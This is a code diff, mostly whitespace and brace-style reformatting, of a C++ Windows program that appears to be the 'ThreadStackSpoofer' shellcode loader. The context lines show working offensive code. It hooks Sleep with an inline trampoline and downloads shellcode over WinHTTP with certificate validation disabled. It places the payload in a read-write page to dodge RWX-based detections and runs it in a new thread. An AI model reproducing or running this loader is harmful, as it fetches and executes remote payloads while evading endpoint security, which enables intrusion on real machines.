@@ -4,7 +4,6 @@
 
 HookedSleep g_hookedSleep;
 
-
 void WINAPI MySleep(DWORD dwMilliseconds)
 {
     //
@@ -38,7 +37,7 @@ void WINAPI MySleep(DWORD dwMilliseconds)
     *overwrite = origReturnAddress;
 }
 
-bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers /*= NULL*/)
+bool fastTrampoline(bool installHook, BYTE *addressToHook, LPVOID jumpAddress, HookTrampolineBuffers *buffers /*= NULL*/)
 {
 #ifdef _WIN64
     uint8_t trampoline[] = {
@@ -50,8 +49,8 @@ bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, H
     memcpy(&trampoline[2], &addr, sizeof(addr));
 #else
     uint8_t trampoline[] = {
-        0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, addr
-        0xFF, 0xE0                        // jmp eax
+        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, addr
+        0xFF, 0xE0                    // jmp eax
     };
 
     uint32_t addr = (uint32_t)(jumpAddress);
@@ -73,11 +72,10 @@ bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, H
         }
 
         if (::VirtualProtect(
-            addressToHook,
-            dwSize,
-            PAGE_EXECUTE_READWRITE,
-            &oldProt
-        ))
+                addressToHook,
+                dwSize,
+                PAGE_EXECUTE_READWRITE,
+                &oldProt))
         {
             memcpy(addressToHook, trampoline, dwSize);
             output = true;
@@ -94,11 +92,10 @@ bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, H
         dwSize = buffers->originalBytesSize;
 
         if (::VirtualProtect(
-            addressToHook,
-            dwSize,
-            PAGE_EXECUTE_READWRITE,
-            &oldProt
-        ))
+                addressToHook,
+                dwSize,
+                PAGE_EXECUTE_READWRITE,
+                &oldProt))
         {
             memcpy(addressToHook, buffers->originalBytes, dwSize);
             output = true;
@@ -120,45 +117,46 @@ bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, H
         addressToHook,
         dwSize,
         oldProt,
-        &oldProt
-    );
+        &oldProt);
 
     return output;
 }
 
 bool hookSleep()
 {
-    HookTrampolineBuffers buffers = { 0 };
+    HookTrampolineBuffers buffers = {0};
     buffers.previousBytes = g_hookedSleep.sleepStub;
     buffers.previousBytesSize = sizeof(g_hookedSleep.sleepStub);
 
     g_hookedSleep.origSleep = reinterpret_cast<typeSleep>(Sleep);
 
-    if (!fastTrampoline(true, (BYTE*)::Sleep, (void*)&MySleep, &buffers))
+    if (!fastTrampoline(true, (BYTE *)::Sleep, (void *)&MySleep, &buffers))
         return false;
 
     return true;
 }
 
-bool downloadShellcode(const char* url, std::vector<uint8_t>& shellcode)
+bool downloadShellcode(const char *url, std::vector<uint8_t> &shellcode)
 {
     HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
     bool success = false;
 
-    do {
+    do
+    {
         hSession = WinHttpOpen(L"ThreadStackSpoofer/1.0",
-                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                              WINHTTP_NO_PROXY_NAME,
-                              WINHTTP_NO_PROXY_BYPASS,
-                              0);
-        if (!hSession) break;
+                               WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                               WINHTTP_NO_PROXY_NAME,
+                               WINHTTP_NO_PROXY_BYPASS,
+                               0);
+        if (!hSession)
+            break;
 
-        WCHAR wUrl[2048] = { 0 };
+        WCHAR wUrl[2048] = {0};
         MultiByteToWideChar(CP_ACP, 0, url, -1, wUrl, 2048);
 
-        URL_COMPONENTS urlComponents = { 0 };
-        WCHAR hostname[256] = { 0 };
-        WCHAR urlPath[1024] = { 0 };
+        URL_COMPONENTS urlComponents = {0};
+        WCHAR hostname[256] = {0};
+        WCHAR urlPath[1024] = {0};
 
         urlComponents.dwStructSize = sizeof(urlComponents);
         urlComponents.lpszHostName = hostname;
@@ -166,43 +164,54 @@ bool downloadShellcode(const char* url, std::vector<uint8_t>& shellcode)
         urlComponents.lpszUrlPath = urlPath;
         urlComponents.dwUrlPathLength = sizeof(urlPath) / sizeof(WCHAR) - 1;
 
-        if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComponents)) break;
+        if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComponents))
+            break;
 
         hConnect = WinHttpConnect(hSession, hostname, urlComponents.nPort, 0);
-        if (!hConnect) break;
+        if (!hConnect)
+            break;
 
         DWORD flags = (urlComponents.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
         hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
-        if (!hRequest) break;
+        if (!hRequest)
+            break;
 
-        if (urlComponents.nScheme == INTERNET_SCHEME_HTTPS) {
+        if (urlComponents.nScheme == INTERNET_SCHEME_HTTPS)
+        {
             DWORD securityFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
-                                 SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
-                                 SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-                                 SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+                                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                                  SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
             WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));
         }
 
-        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) break;
-        if (!WinHttpReceiveResponse(hRequest, NULL)) break;
+        if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
+            break;
+        if (!WinHttpReceiveResponse(hRequest, NULL))
+            break;
 
         DWORD statusCode = 0;
         DWORD statusCodeSize = sizeof(statusCode);
         WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL);
 
-        if (statusCode != 200) break;
+        if (statusCode != 200)
+            break;
 
         std::vector<uint8_t> buffer;
         DWORD bytesRead = 0;
         DWORD bytesAvailable = 0;
 
-        do {
-            if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable)) break;
-            if (bytesAvailable == 0) break;
+        do
+        {
+            if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable))
+                break;
+            if (bytesAvailable == 0)
+                break;
 
             std::vector<uint8_t> tempBuffer(bytesAvailable);
-            if (!WinHttpReadData(hRequest, tempBuffer.data(), bytesAvailable, &bytesRead)) break;
+            if (!WinHttpReadData(hRequest, tempBuffer.data(), bytesAvailable, &bytesRead))
+                break;
 
             buffer.insert(buffer.end(), tempBuffer.begin(), tempBuffer.begin() + bytesRead);
         } while (bytesAvailable > 0);
@@ -212,16 +221,19 @@ bool downloadShellcode(const char* url, std::vector<uint8_t>& shellcode)
 
     } while (false);
 
-    if (hRequest) WinHttpCloseHandle(hRequest);
-    if (hConnect) WinHttpCloseHandle(hConnect);
-    if (hSession) WinHttpCloseHandle(hSession);
+    if (hRequest)
+        WinHttpCloseHandle(hRequest);
+    if (hConnect)
+        WinHttpCloseHandle(hConnect);
+    if (hSession)
+        WinHttpCloseHandle(hSession);
 
     return success;
 }
 
 void runShellcode(LPVOID param)
 {
-    auto func = ((void(*)())param);
+    auto func = ((void (*)())param);
 
     //
     // Jumping to shellcode. Look at the coment in injectShellcode() describing why we opted to jump
@@ -231,7 +243,7 @@ void runShellcode(LPVOID param)
     func();
 }
 
-bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread)
+bool injectShellcode(std::vector<uint8_t> &shellcode, HandlePtr &thread)
 {
     //
     // Firstly we allocate RW page to avoid RWX-based IOC detections
@@ -240,8 +252,7 @@ bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread)
         NULL,
         shellcode.size() + 1,
         MEM_COMMIT,
-        PAGE_READWRITE
-    );
+        PAGE_READWRITE);
 
     if (!alloc)
         return false;
@@ -284,13 +295,12 @@ bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread)
         (LPTHREAD_START_ROUTINE)runShellcode,
         alloc,
         0,
-        0
-    ));
+        0));
 
     return (NULL != thread.get());
 }
 
-int main(int argc, char** argv)
+int main(int argc, char **argv)
 {
     if (argc < 3)
     {
